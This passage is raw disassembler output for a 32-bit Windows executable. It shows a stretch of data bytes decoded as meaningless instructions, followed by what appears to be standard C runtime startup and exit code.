  42238a:	repnz outs dx,DWORD PTR ds:[esi]
  42238d:	call   0x9a9bd153
  422392:	dec    ebp
  422393:	and    esp,DWORD PTR [ebx+0x7c7b01c3]
  422399:	pop    ebx
  42239a:	imul   DWORD PTR [ecx-0x5]
  42239d:	push   ecx
  42239e:	fs inc ebx
  4223a0:	loope  0x42235b
  4223a2:	push   ebp
  4223a3:	mov    esi,?
  4223a5:	push   0xdee62375
  4223aa:	pushf  
  4223ab:	mov    ds:0x9934cb64,eax
  4223b0:	fisubr WORD PTR [edi+ebp*8-0x4a]
  4223b4:	inc    ebp
  4223b5:	jnp    0x4223be
  4223b7:	mov    bl,0x7e
  4223b9:	mov    edx,eax
  4223bb:	sti    
  4223bc:	clc    
  4223bd:	nop
  4223be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223bf:	xchg   ebp,eax
  4223c0:	jle    0x422386
  4223c2:	or     ebx,DWORD PTR [esi-0x69800256]
  4223c8:	jge    0x422353
  4223ca:	(bad)  
  4223cb:	test   eax,0x59a2f07b
  4223d0:	enter  0x71ce,0xed
  4223d4:	sti    
  4223d5:	sub    eax,0x6714f1cf
  4223da:	jle    0x422373
  4223dc:	and    BYTE PTR [ebx+0x7dfb95a6],bh
  4223e2:	out    0xe1,eax
  4223e4:	add    eax,0x33c4ad15
  4223e9:	mov    ebp,0x269beef3
  4223ee:	inc    ebx
  4223ef:	jne    0x422374
  4223f1:	nop
  4223f2:	add    ch,BYTE PTR [esi+0x1c0ad821]
  4223f8:	and    eax,DWORD PTR [esi+ecx*8]
  4223fb:	xor    edi,DWORD PTR [edi]
  4223fd:	mul    BYTE PTR [eax+edx*2-0x5f]
  422401:	mov    eax,ds:0x74fd96e5
  422406:	mov    esp,0x909a6c47
  42240b:	pop    es
  42240c:	mov    es,WORD PTR [ecx-0xf8afde9]
  422412:	shr    BYTE PTR [ebx-0x1e],1
  422415:	iret   
  422416:	mov    ecx,0xaa6a2e63
  42241b:	add    ah,BYTE PTR [edx+esi*1+0x6152d33b]
  422422:	pusha  
  422423:	out    0x8d,eax
  422425:	mov    al,ds:0x12fbc7ac
  42242a:	retf   0x5ab2
  42242d:	xchg   edx,eax
  42242e:	pop    ss
  42242f:	push   ebp
  422430:	fcmovnu st,st(4)
  422432:	mov    esp,0x7e515f46
  422437:	les    esp,FWORD PTR [edi+eax*1+0x20178fe7]
  42243e:	lock fisttp WORD PTR [ebx+edi*2+0x7e]
  422443:	xchg   DWORD PTR [ebp+0x50],edi
  422446:	hlt    
  422447:	mov    esi,0x9c3fc8f8
  42244c:	fnstenv [edi-0x1855e1bb]
  422452:	xchg   BYTE PTR [ecx],bh
  422454:	fsubr  QWORD PTR [ebx+esi*2]
  422457:	je     0x422467
  422459:	jl     0x422466
  42245b:	sub    BYTE PTR [esp+esi*8+0x4a],cl
  42245f:	add    DWORD PTR [ecx+edi*1],ecx
  422462:	add    bl,BYTE PTR [ebx]
  422464:	and    dh,BYTE PTR [eax+0xe]
  422467:	dec    edx
  422468:	mov    ah,0xac
  42246a:	(bad)  
  42246b:	mov    cl,0xac
  42246d:	xor    BYTE PTR [edx],al
  42246f:	xchg   ebp,eax
  422470:	cli    
  422471:	add    eax,0xf53c57da
  422476:	in     al,dx
  422477:	pop    ecx
  422478:	neg    DWORD PTR [ebp+0x95cd041]
  42247e:	(bad)  
  42247f:	int    0x1a
  422481:	jae    0x4224c0
  422483:	imul   esp,DWORD PTR [ecx+eax*1+0x6e3e0d61],0xffffffa2
  42248b:	nop
  42248c:	jo     0x4224ea
  42248e:	iret   
  42248f:	popa   
  422490:	repnz push ebx
  422492:	inc    eax
  422493:	xchg   ebp,eax
  422494:	mov    eax,0x5f0467fc
  422499:	comiss xmm0,DWORD PTR [edx]
  42249c:	add    eax,0xe418fbb6
  4224a1:	push   ds
  4224a2:	add    al,0x55
  4224a4:	and    al,0xc5
  4224a6:	mov    esi,0x7a488b37
  4224ab:	push   esi
  4224ac:	imul   edx,esi,0xffffff9e
  4224af:	int3   
  4224b0:	add    BYTE PTR [eax+0x45],bh
  4224b3:	js     0x4224ae
  4224b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224b6:	fadd   QWORD PTR [esi-0x4c]
  4224b9:	mov    ebx,0x32c87ffa
  4224be:	inc    esi
  4224bf:	imul   ecx,DWORD PTR [ebp+0x46b360fe],0x48
  4224c6:	mov    ch,0x3a
  4224c8:	ret    
  4224c9:	add    al,BYTE PTR [ebp+0x52ca79f2]
  4224cf:	in     al,0x2a
  4224d1:	mov    ch,0xd1
  4224d3:	std    
  4224d4:	retf   0xf940
  4224d7:	mov    ?,edx
  4224d9:	test   al,0x50
  4224db:	pop    es
  4224dc:	aaa    
  4224dd:	les    edi,FWORD PTR [edx-0x66f8c173]
  4224e3:	cmp    ah,dl
  4224e5:	push   cs
  4224e6:	pop    es
  4224e7:	mov    ecx,0x61265d00
  4224ec:	scas   al,BYTE PTR es:[edi]
  4224ed:	test   BYTE PTR [eax-0x5f4a3112],0xfc
  4224f4:	sub    BYTE PTR [ebx+0x4240b0db],dh
  4224fa:	or     BYTE PTR [edi+0x1e8676d2],cl
  422500:	es das 
  422502:	inc    ecx
  422503:	pusha  
  422504:	cmp    eax,0xbd31a8bb
  422509:	xor    al,0x97
  42250b:	ja     0x422501
  42250d:	retf   
  42250e:	outs   dx,BYTE PTR ds:[esi]
  42250f:	call   0xa222:0x215cf774
  422516:	outs   dx,DWORD PTR ds:[esi]
  422517:	mov    BYTE PTR [esi],bl
  422519:	dec    eax
  42251a:	lods   eax,DWORD PTR ds:[esi]
  42251b:	xchg   edx,eax
  42251c:	ja     0x4224d3
  42251e:	pusha  
  42251f:	sub    DWORD PTR [ecx-0x5f],edi
  422522:	push   edi
  422523:	xchg   esp,eax
  422524:	fstp   DWORD PTR [bx+si+0x6e06]
  422529:	call   0xcb85:0x9ba50642
  422530:	rcl    DWORD PTR [esi-0x79d490b4],0x3c
  422537:	cld    
  422538:	mov    ?,WORD PTR [eax]
  42253a:	aam    0x7c
  42253c:	and    BYTE PTR [ecx-0x1f],cl
  42253f:	push   0x9
  422541:	add    DWORD PTR [ebp-0x2],ebp
  422544:	xchg   BYTE PTR [esi+eax*8-0x53],al
  422548:	xor    eax,0x214ad826
  42254d:	push   ds
  42254e:	cli    
  42254f:	imul   edx,DWORD PTR [edi],0x40
  422552:	cmp    al,BYTE PTR [edi]
  422554:	stos   DWORD PTR es:[edi],eax
  422555:	push   0xffffffc2
  422557:	push   es
  422558:	jnp    0x42255d
  42255a:	popa   
  42255b:	xchg   esp,eax
  42255c:	push   es
  42255d:	daa    
  42255e:	cmp    ah,BYTE PTR [edi-0x554ece4a]
  422564:	dec    esi
  422565:	outs   dx,BYTE PTR ds:[esi]
  422566:	add    al,0xeb
  422568:	daa    
  422569:	pop    esp
  42256a:	or     ecx,DWORD PTR [edx-0x2be4c817]
  422570:	xor    al,0x21
  422572:	test   al,0xa0
  422574:	sbb    ecx,DWORD PTR [edx]
  422576:	sbb    DWORD PTR [ebx-0x10597e61],edi
  42257c:	cld    
  42257d:	in     eax,0x13
  42257f:	out    0x50,al
  422581:	outs   dx,DWORD PTR ds:[esi]
  422582:	pusha  
  422583:	cli    
  422584:	dec    ecx
  422585:	stos   DWORD PTR es:[edi],eax
  422586:	mov    DWORD PTR [ebp+0x63ca5191],edi
  42258c:	stc    
  42258d:	xchg   edi,eax
  42258e:	xchg   ecx,eax
  42258f:	(bad)  
  422590:	mov    ds:0x484bd5eb,eax
  422595:	mov    ebx,0x8977a241
  42259a:	out    0x99,eax
  42259c:	push   0x94894958
  4225a1:	mov    BYTE PTR [ebx+eax*2-0x67],ah
  4225a5:	in     al,dx
  4225a6:	xchg   ecx,eax
  4225a7:	mov    ebp,0xc51c162e
  4225ac:	mov    esi,0x1bcdb908
  4225b1:	sar    WORD PTR [esi],cl
  4225b4:	retf   
  4225b5:	jae    0x422586
  4225b7:	or     eax,0xbc0382c3
  4225bc:	push   0xb8b6eb8a
  4225c1:	je     0x422570
  4225c3:	mov    esp,DWORD PTR [edi+0x620b5234]
  4225c9:	sti    
  4225ca:	ror    DWORD PTR [edi+0x66],0xb4
  4225ce:	leave  
  4225cf:	adc    eax,0xd40c3e83
  4225d4:	sbb    BYTE PTR [esi*8-0x6fe255fd],dh
  4225db:	mov    eax,0xb4cda8b3
  4225e0:	and    al,BYTE PTR [edx+0x51]
  4225e3:	cmp    DWORD PTR ds:0x928d3c54,0x17
  4225ea:	data16 repz ja 0x422599
  4225ee:	and    al,0xbf
  4225f0:	xchg   edx,eax
  4225f1:	dec    ebp
  4225f2:	lea    edx,[edx+0x25]
  4225f5:	dec    ebp
  4225f6:	jle    0x4225a5
  4225f8:	cmc    
  4225f9:	addr16 std 
  4225fb:	adc    dh,BYTE PTR [eax+0x79]
  4225fe:	repnz pop edi
  422600:	jle    0x422597
  422602:	cmp    BYTE PTR [edx+0x21929782],0x27
  422609:	pop    es
  42260a:	push   ebp
  42260b:	and    eax,0xde49b303
  422610:	push   es
  422611:	(bad)  
  422612:	pop    ds
  422613:	push   ebp
  422614:	pop    ss
  422615:	retf   
  422616:	mov    bl,0x1b
  422618:	int3   
  422619:	fidiv  WORD PTR [edi+0x3835943f]
  42261f:	cmp    esp,esp
  422621:	dec    ecx
  422622:	mov    ebp,0x44436883
  422627:	xor    edx,DWORD PTR [ebp-0x5e3c1edd]
  42262d:	repz cmp DWORD PTR [eax-0x3aa890cc],0x33
  422635:	shr    dl,0x39
  422638:	jmp    0xa92:0xedbc084c
  42263f:	(bad)  
  422640:	lock test al,0xe3
  422643:	sub    al,0x83
  422645:	bound  edi,QWORD PTR [edi]
  422647:	into   
  422648:	mov    WORD PTR [edi-0x7f],?
  42264b:	shl    dl,0x1b
  42264e:	or     edx,ebx
  422650:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422651:	stc    
  422652:	mov    ds:0xc86bc13a,al
  422657:	test   al,0x5
  422659:	mov    eax,DWORD PTR [eax]
  42265b:	mov    cl,0x66
  42265d:	mov    eax,ds:0x34515a4e
  422662:	sbb    eax,0xb9b8d25
  422667:	pop    esi
  422668:	jge    0x4225ef
  42266a:	mov    ah,BYTE PTR [eax]
  42266c:	dec    ebx
  42266d:	dec    ebp
  42266e:	mov    ebp,0xf44ebead
  422673:	add    BYTE PTR [esi+0x23],dl
  422676:	xor    BYTE PTR [eax-0x59],al
  422679:	(bad)  
  42267b:	pop    esi
  42267c:	arpl   bx,si
  42267e:	mov    cs,WORD PTR [ebx*4+0x7e8dbc32]
  422685:	stc    
  422686:	mov    ecx,0x2ffb89e9
  42268b:	arpl   WORD PTR [edx+0x218d2adf],si
  422691:	and    al,0x5a
  422693:	std    
  422694:	stos   BYTE PTR es:[edi],al
  422695:	jg     0x4226c0
  422697:	lea    edi,[edi-0x31]
  42269a:	imul   esi,DWORD PTR [eax+0x7fddc3e7],0xbdf3cdbb
  4226a4:	dec    ebx
  4226a5:	push   edx
  4226a6:	aad    0x8c
  4226a8:	push   edi
  4226a9:	mov    bh,0xc0
  4226ab:	out    0xc6,eax
  4226ad:	rcr    BYTE PTR [ebp+0x626eb3cc],0xcc
  4226b4:	call   FWORD PTR [edx+0x6b4ee1fb]
  4226ba:	mov    bh,0xae
  4226bc:	lahf   
  4226bd:	int    0xc8
  4226bf:	scas   eax,DWORD PTR es:[edi]
  4226c0:	xchg   ebx,eax
  4226c1:	(bad)  
  4226c2:	call   DWORD PTR [ecx]
  4226c4:	pop    es
  4226c5:	test   BYTE PTR [edx-0x2e],ch
  4226c8:	cwde   
  4226c9:	je     0xec495ba1
  4226cf:	in     eax,dx
  4226d0:	outs   dx,DWORD PTR ds:[esi]
  4226d1:	loope  0x4226ff
  4226d3:	sub    ah,BYTE PTR [edx-0x7b]
  4226d6:	shl    BYTE PTR [eax+0x9],cl
  4226d9:	push   ebp
  4226da:	mov    edx,0xb3a0a78e
  4226df:	and    al,0xf9
  4226e1:	adc    edi,DWORD PTR [edi-0x57]
  4226e4:	fcomp  DWORD PTR [ecx+0x1b]
  4226e7:	adc    DWORD PTR [ebx-0x1103aaee],eax
  4226ed:	adc    esi,edx
  4226ef:	into   
  4226f0:	fwait
  4226f1:	add    edx,DWORD PTR [esi+ebp*4+0x4e9929b3]
  4226f8:	mov    eax,ds:0xf04c06f4
  4226fd:	test   BYTE PTR [eax+esi*4-0x18434b65],al
  422704:	lock test BYTE PTR [esi+0x5e21847c],al
  42270b:	loop   0x422749
  42270d:	fcmovnb st,st(7)
  42270f:	cmp    dl,BYTE PTR [edx-0x19b58974]
  422715:	loopne 0x42270d
  422717:	dec    eax
  422718:	fadd   DWORD PTR [ecx-0x58]
  42271b:	aad    0x4
  42271d:	jnp    0x42271d
  42271f:	jl     0x42276e
  422721:	sbb    BYTE PTR [ebx+0x7a],ah
  422724:	rol    DWORD PTR [esi],cl
  422726:	cmc    
  422727:	sbb    DWORD PTR [edx],edi
  422729:	jns    0x4226cb
  42272b:	adc    DWORD PTR [ecx+0x7ef716be],ebx
  422731:	xlat   BYTE PTR ds:[ebx]
  422732:	dec    edi
  422733:	popa   
  422734:	push   cs
  422735:	mov    dh,0xa0
  422737:	pop    edi
  422738:	sub    eax,0x1edee7ff
  42273d:	pushf  
  42273e:	push   ebx
  42273f:	dec    esi
  422740:	das    
  422741:	lods   al,BYTE PTR ds:[esi]
  422742:	pop    ds
  422743:	ret    0xe27a
  422746:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  422748:	cmp    dh,dl
  42274a:	sub    al,0xd1
  42274c:	pop    ecx
  42274d:	fsub   st(3),st
  42274f:	push   esi
  422750:	scas   al,BYTE PTR es:[edi]
  422751:	mov    dh,0x44
  422753:	dec    ebp
  422754:	push   ecx
  422755:	xchg   al,bh
  422757:	xor    cl,BYTE PTR [esi]
  422759:	daa    
  42275a:	inc    ecx
  42275b:	aad    0xde
  42275d:	and    al,0xed
  42275f:	stos   BYTE PTR es:[edi],al
  422760:	mov    ds:0x210547a4,al
  422765:	aaa    
  422766:	mov    ecx,fs
  422768:	jmp    0x422781
  42276a:	and    eax,0x7325f929
  42276f:	fwait
  422770:	pushf  
  422771:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422772:	daa    
  422773:	push   edi
  422774:	mov    eax,ds:0x56945755
  422779:	dec    esi
  42277a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42277b:	inc    ecx
  42277c:	or     DWORD PTR [eax+0x17c25eee],eax
  422782:	push   ebp
  422783:	sbb    bh,dh
  422785:	dec    ebp
  422786:	inc    ebx
  422787:	push   0xffffffd1
  422789:	in     al,0x9c
  42278b:	out    dx,al
  42278c:	xor    eax,0x31efeb04
  422791:	in     al,0xeb
  422793:	push   cs
  422794:	and    BYTE PTR [eax+0x5805a58e],cl
  42279a:	lock sti 
  42279c:	cli    
  42279d:	or     BYTE PTR ds:0x6de684bf,bl
  4227a3:	mov    esp,0xbe8f7bfc
  4227a8:	jle    0x42276b
  4227aa:	adc    ah,dl
  4227ac:	repnz fdiv st,st(0)
  4227af:	or     ah,cl
  4227b1:	jbe    0x4227df
  4227b3:	xchg   WORD PTR [esi],bx
  4227b6:	retf   0xd123
  4227b9:	(bad)  
  4227ba:	jmp    0xa1d9:0xba316a7f
  4227c1:	loop   0x4227f4
  4227c3:	push   ecx
  4227c4:	jae    0x422778
  4227c6:	fwait
  4227c7:	inc    ecx
  4227c8:	call   0xbec:0xf7c822d
  4227cf:	shr    bh,0x48
  4227d2:	ins    DWORD PTR es:[edi],dx
  4227d3:	out    dx,al
  4227d4:	or     ecx,DWORD PTR [eax+0x25ed8866]
  4227da:	pop    edi
  4227db:	aad    0xd8
  4227dd:	in     eax,0x9d
  4227df:	ds nop
  4227e1:	inc    edx
  4227e2:	fidiv  DWORD PTR [eax+0x539c4f15]
  4227e8:	mov    ds:0x5fc71de9,al
  4227ed:	push   edx
  4227ee:	stc    
  4227ef:	popf   
  4227f0:	push   ebx
  4227f1:	clc    
  4227f2:	mov    ebx,0x9886ff8f
  4227f7:	cdq    
  4227f8:	cmp    dl,cl
  4227fa:	adc    eax,0x51c6042e
  4227ff:	cld    
  422800:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422801:	test   eax,0x41dd6c87
  422806:	and    edi,esp
  422808:	adc    edx,DWORD PTR ds:0x633611b2
  42280e:	test   DWORD PTR [edi],edx
  422810:	inc    esi
  422811:	push   ebp
  422812:	int    0xf1
  422814:	push   cs
  422815:	shl    DWORD PTR [edx+0x50],0x40
  422819:	les    esi,FWORD PTR [eax+0x5c691cae]
  42281f:	cld    
  422820:	jns    0x422808
  422822:	inc    esp
  422823:	mov    dh,0xe6
  422825:	dec    ebx
  422826:	sti    
  422827:	jo     0x4227ce
  422829:	adc    al,BYTE PTR [ebx+0x5b]
  42282c:	aas    
  42282d:	xor    eax,0xc1d2d320
  422832:	jecxz  0x4227b5
  422834:	sbb    ecx,DWORD PTR [esi]
  422836:	xchg   esp,eax
  422837:	jl     0x42285c
  422839:	push   ss
  42283a:	mov    ebp,0x632e210e
  42283f:	mov    eax,ds:0x77fe94e1
  422844:	pop    esi
  422845:	xor    ch,0xa
  422848:	fadd   QWORD PTR [eax-0x42be0e83]
  42284e:	test   DWORD PTR ds:0x5252e8c4,0x97b13a86
  422858:	mov    bh,0x97
  42285a:	in     al,dx
  42285b:	popf   
  42285c:	loop   0x4228b1
  42285e:	jne    0x422802
  422860:	push   0x62
  422862:	or     eax,0x6d620406
  422867:	shl    DWORD PTR [ebp-0x52e6d291],cl
  42286d:	push   cs
  42286e:	push   ebx
  42286f:	xlat   BYTE PTR ds:[ebx]
  422870:	or     eax,DWORD PTR [edx+edi*2-0x3d7b7885]
  422877:	sbb    eax,0x5ba8556
  42287c:	xor    eax,0x7c5984b9
  422881:	das    
  422882:	dec    ebp
  422883:	sub    al,0x26
  422885:	dec    ebx
  422886:	and    al,0x36
  422888:	test   BYTE PTR [edx-0x1a5a94ad],ch
  42288e:	mov    ebx,0x262dd242
  422893:	cli    
  422894:	repnz add DWORD PTR [esi+0x31],edi
  422898:	or     edx,ebx
  42289a:	jg     0x4228d9
  42289c:	imul   edx,ebx,0xffffffca
  42289f:	pop    ecx
  4228a0:	cmp    dh,BYTE PTR [edx-0x24114d31]
  4228a6:	rol    ebx,1
  4228a8:	mov    bl,0xbe
  4228aa:	mov    cl,0xd7
  4228ac:	push   eax
  4228ad:	aad    0x1b
  4228af:	(bad)  
  4228b0:	push   DWORD PTR ds:[edi+0x3aa99cc2]
  4228b7:	cld    
  4228b8:	dec    esp
  4228b9:	repnz repz or eax,0xe60c6d1b
  4228c0:	jmp    FWORD PTR [ecx]
  4228c2:	and    ebp,DWORD PTR [ebp-0x23]
  4228c5:	pop    ds
  4228c6:	jb     0x4228ff
  4228c8:	(bad)  
  4228c9:	out    dx,eax
  4228ca:	popf   
  4228cb:	fstp   TBYTE PTR [edi]
  4228cd:	pusha  
  4228ce:	stc    
  4228cf:	mov    al,0x28
  4228d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228d2:	lahf   
  4228d3:	cld    
  4228d4:	mov    dl,0x73
  4228d6:	lods   al,BYTE PTR ds:[esi]
  4228d7:	adc    eax,0xea664312
  4228dc:	repz dec ecx
  4228de:	repnz or BYTE PTR [eax-0xb935834],al
  4228e5:	jns    0x422934
  4228e7:	idiv   dl
  4228e9:	sub    ebx,DWORD PTR [edi]
  4228eb:	fsub   st(5),st
  4228ed:	ret    
  4228ee:	push   0x746f7ffc
  4228f3:	inc    eax
  4228f4:	aad    0xdb
  4228f6:	push   cs
  4228f7:	or     eax,DWORD PTR [ecx-0x1abc192b]
  4228fd:	scas   eax,DWORD PTR es:[edi]
  4228fe:	div    DWORD PTR [ebx+ebx*8-0x7e]
  422902:	mov    edi,0x74c76c9b
  422907:	scas   eax,DWORD PTR es:[edi]
  422908:	xchg   DWORD PTR [esp+esi*4+0x3d5fb7a1],esi
  42290f:	push   0xe54c0c9e
  422914:	je     0x422949
  422916:	ror    BYTE PTR [ebx+0x10c25de5],0x0
  42291d:	nop
  42291e:	nop
  42291f:	nop
  422920:	cmp    DWORD PTR ds:0x45cabc,0x1
  422927:	jne    0x42292e
  422929:	call   0x422e6c
  42292e:	push   DWORD PTR [esp+0x4]
  422932:	call   0x422cf5
  422937:	push   0xff
  42293c:	call   DWORD PTR ds:0x45c1c0
  422942:	pop    ecx
  422943:	pop    ecx
  422944:	ret    
  422945:	cmp    DWORD PTR ds:0x45cabc,0x1
  42294c:	jne    0x422953
  42294e:	call   0x422e6c
  422953:	push   DWORD PTR [esp+0x4]
  422957:	call   0x422cf5
  42295c:	push   0xff
  422961:	call   0x422b3b
  422966:	pop    ecx
  422967:	pop    ecx
  422968:	ret    
  422969:	push   0x60
  42296b:	push   0x428110
  422970:	call   0x423858
  422975:	mov    edi,0x94
  42297a:	mov    eax,edi
  42297c:	call   0x4238b0
  422981:	mov    DWORD PTR [ebp-0x18],esp
  422984:	mov    esi,esp
  422986:	mov    DWORD PTR [esi],edi
  422988:	push   esi
  422989:	call   DWORD PTR ds:0x428024
  42298f:	mov    ecx,DWORD PTR [esi+0x10]
  422992:	mov    DWORD PTR ds:0x45cac4,ecx
  422998:	mov    eax,DWORD PTR [esi+0x4]
  42299b:	mov    ds:0x45cad0,eax
  4229a0:	mov    edx,DWORD PTR [esi+0x8]
  4229a3:	mov    DWORD PTR ds:0x45cad4,edx
  4229a9:	mov    esi,DWORD PTR [esi+0xc]
  4229ac:	and    esi,0x7fff
  4229b2:	mov    DWORD PTR ds:0x45cac8,esi
  4229b8:	cmp    ecx,0x2
  4229bb:	je     0x4229c9
  4229bd:	or     esi,0x8000
  4229c3:	mov    DWORD PTR ds:0x45cac8,esi
  4229c9:	shl    eax,0x8
  4229cc:	add    eax,edx
  4229ce:	mov    ds:0x45cacc,eax
  4229d3:	xor    esi,esi
  4229d5:	push   esi
  4229d6:	mov    edi,DWORD PTR ds:0x428014
  4229dc:	call   edi
  4229de:	cmp    WORD PTR [eax],0x5a4d
  4229e3:	jne    0x422a04
  4229e5:	mov    ecx,DWORD PTR [eax+0x3c]
  4229e8:	add    ecx,eax
  4229ea:	cmp    DWORD PTR [ecx],0x4550
  4229f0:	jne    0x422a04
  4229f2:	movzx  eax,WORD PTR [ecx+0x18]
  4229f6:	cmp    eax,0x10b
  4229fb:	je     0x422a1c
  4229fd:	cmp    eax,0x20b
  422a02:	je     0x422a09
  422a04:	mov    DWORD PTR [ebp-0x1c],esi
  422a07:	jmp    0x422a30
  422a09:	cmp    DWORD PTR [ecx+0x84],0xe
  422a10:	jbe    0x422a04
  422a12:	xor    eax,eax
  422a14:	cmp    DWORD PTR [ecx+0xf8],esi
  422a1a:	jmp    0x422a2a
  422a1c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a20:	jbe    0x422a04
  422a22:	xor    eax,eax
  422a24:	cmp    DWORD PTR [ecx+0xe8],esi
  422a2a:	setne  al
  422a2d:	mov    DWORD PTR [ebp-0x1c],eax
  422a30:	push   0x1
  422a32:	call   0x423807
  422a37:	pop    ecx
  422a38:	test   eax,eax
  422a3a:	jne    0x422a44
  422a3c:	push   0x1c
  422a3e:	call   0x422945
  422a43:	pop    ecx
  422a44:	call   0x42377e
  422a49:	test   eax,eax
  422a4b:	jne    0x422a55
  422a4d:	push   0x10
  422a4f:	call   0x422945
  422a54:	pop    ecx
  422a55:	call   0x423667
  422a5a:	mov    DWORD PTR [ebp-0x4],esi
  422a5d:	call   0x423469
  422a62:	test   eax,eax
  422a64:	jge    0x422a6e
  422a66:	push   0x1b
  422a68:	call   0x422920
  422a6d:	pop    ecx
  422a6e:	call   DWORD PTR ds:0x428020
  422a74:	mov    ds:0x45d274,eax
  422a79:	call   0x423347
  422a7e:	mov    ds:0x45cab4,eax
  422a83:	call   0x4232a5
  422a88:	test   eax,eax
  422a8a:	jge    0x422a94
  422a8c:	push   0x8
  422a8e:	call   0x422920
  422a93:	pop    ecx
  422a94:	call   0x423072
  422a99:	test   eax,eax
  422a9b:	jge    0x422aa5
  422a9d:	push   0x9
  422a9f:	call   0x422920
  422aa4:	pop    ecx
  422aa5:	call   0x422b7d
  422aaa:	mov    DWORD PTR [ebp-0x20],eax
  422aad:	cmp    eax,esi
  422aaf:	je     0x422ab8
  422ab1:	push   eax
  422ab2:	call   0x422920
  422ab7:	pop    ecx
  422ab8:	mov    DWORD PTR [ebp-0x38],esi
  422abb:	lea    eax,[ebp-0x64]
  422abe:	push   eax
  422abf:	call   DWORD PTR ds:0x42801c
  422ac5:	call   0x423009
  422aca:	mov    DWORD PTR [ebp-0x68],eax
  422acd:	test   BYTE PTR [ebp-0x38],0x1
  422ad1:	je     0x422ad9
  422ad3:	movzx  eax,WORD PTR [ebp-0x34]
  422ad7:	jmp    0x422adc
  422ad9:	push   0xa
  422adb:	pop    eax
  422adc:	push   eax
  422add:	push   DWORD PTR [ebp-0x68]
  422ae0:	push   esi
  422ae1:	push   esi
  422ae2:	call   edi
  422ae4:	push   eax
  422ae5:	call   0x421790
  422aea:	mov    edi,eax
  422aec:	mov    DWORD PTR [ebp-0x6c],edi
  422aef:	cmp    DWORD PTR [ebp-0x1c],esi
  422af2:	jne    0x422afa
  422af4:	push   edi
  422af5:	call   0x422cb5
  422afa:	call   0x422cd7
  422aff:	jmp    0x422b2c
  422b01:	mov    eax,DWORD PTR [ebp-0x14]
  422b04:	mov    ecx,DWORD PTR [eax]
  422b06:	mov    ecx,DWORD PTR [ecx]
  422b08:	mov    DWORD PTR [ebp-0x70],ecx
  422b0b:	push   eax
  422b0c:	push   ecx
  422b0d:	call   0x422ea5
  422b12:	pop    ecx
  422b13:	pop    ecx
  422b14:	ret    
  422b15:	mov    esp,DWORD PTR [ebp-0x18]
  422b18:	mov    edi,DWORD PTR [ebp-0x70]
  422b1b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b1f:	jne    0x422b27
  422b21:	push   edi
  422b22:	call   0x422cc6
  422b27:	call   0x422ce6
  422b2c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b30:	mov    eax,edi
  422b32:	lea    esp,[ebp-0x7c]
  422b35:	call   0x423893
  422b3a:	ret    
  422b3b:	push   0x42812c
  422b40:	call   DWORD PTR ds:0x428014
  422b46:	test   eax,eax
  422b48:	je     0x422b60
  422b4a:	push   0x42811c
  422b4f:	push   eax
  422b50:	call   DWORD PTR ds:0x428018
  422b56:	test   eax,eax
  422b58:	je     0x422b60
  422b5a:	push   DWORD PTR [esp+0x4]
  422b5e:	call   eax
  422b60:	push   DWORD PTR [esp+0x4]
  422b64:	call   DWORD PTR ds:0x428028
  422b6a:	int3   
  422b6b:	push   0x8
  422b6d:	call   0x423a1f
  422b72:	pop    ecx
  422b73:	ret    
  422b74:	push   0x8
  422b76:	call   0x42398b
  422b7b:	pop    ecx
  422b7c:	ret    
  422b7d:	mov    eax,ds:0x45d270
  422b82:	test   eax,eax
  422b84:	je     0x422b88
  422b86:	call   eax
  422b88:	push   esi
  422b89:	push   edi
  422b8a:	mov    ecx,0x42a00c
  422b8f:	mov    edi,0x42a018
  422b94:	xor    eax,eax
  422b96:	cmp    ecx,edi
  422b98:	mov    esi,ecx
  422b9a:	jae    0x422bb3
  422b9c:	test   eax,eax
  422b9e:	jne    0x422bdf
  422ba0:	mov    ecx,DWORD PTR [esi]
  422ba2:	test   ecx,ecx
  422ba4:	je     0x422ba8
  422ba6:	call   ecx
  422ba8:	add    esi,0x4
  422bab:	cmp    esi,edi
  422bad:	jb     0x422b9c
  422baf:	test   eax,eax
  422bb1:	jne    0x422bdf
  422bb3:	push   0x4236ab
  422bb8:	call   0x423b30
  422bbd:	mov    esi,0x42a000
  422bc2:	mov    eax,esi
  422bc4:	mov    edi,0x42a008
  422bc9:	cmp    eax,edi
  422bcb:	pop    ecx
  422bcc:	jae    0x422bdd
  422bce:	mov    eax,DWORD PTR [esi]
  422bd0:	test   eax,eax
  422bd2:	je     0x422bd6
  422bd4:	call   eax
  422bd6:	add    esi,0x4
  422bd9:	cmp    esi,edi
  422bdb:	jb     0x422bce
  422bdd:	xor    eax,eax
  422bdf:	pop    edi
  422be0:	pop    esi
  422be1:	ret    
  422be2:	push   ebp
  422be3:	mov    ebp,esp
  422be5:	push   esi
  422be6:	push   edi
  422be7:	push   0x8
  422be9:	call   0x423a1f
  422bee:	xor    esi,esi
  422bf0:	inc    esi
  422bf1:	cmp    DWORD PTR ds:0x45cb04,esi
  422bf7:	pop    ecx
  422bf8:	jne    0x422c0a
  422bfa:	push   DWORD PTR [ebp+0x8]
  422bfd:	call   DWORD PTR ds:0x428030
  422c03:	push   eax
  422c04:	call   DWORD PTR ds:0x42802c
  422c0a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c0e:	mov    al,BYTE PTR [ebp+0x10]
  422c11:	mov    DWORD PTR ds:0x45cb00,esi
  422c17:	mov    ds:0x45cafc,al
  422c1c:	jne    0x422c70
  422c1e:	mov    ecx,DWORD PTR ds:0x45d268
  422c24:	test   ecx,ecx
  422c26:	je     0x422c51
  422c28:	mov    eax,ds:0x45d264
  422c2d:	sub    eax,0x4
  422c30:	cmp    eax,ecx
  422c32:	jmp    0x422c4a
  422c34:	mov    eax,DWORD PTR [eax]
  422c36:	test   eax,eax
  422c38:	je     0x422c3c
  422c3a:	call   eax
  422c3c:	mov    eax,ds:0x45d264
  422c41:	sub    eax,0x4
  422c44:	cmp    eax,DWORD PTR ds:0x45d268
  422c4a:	mov    ds:0x45d264,eax
  422c4f:	jae    0x422c34
  422c51:	mov    eax,0x42a01c
  422c56:	mov    esi,0x42a020
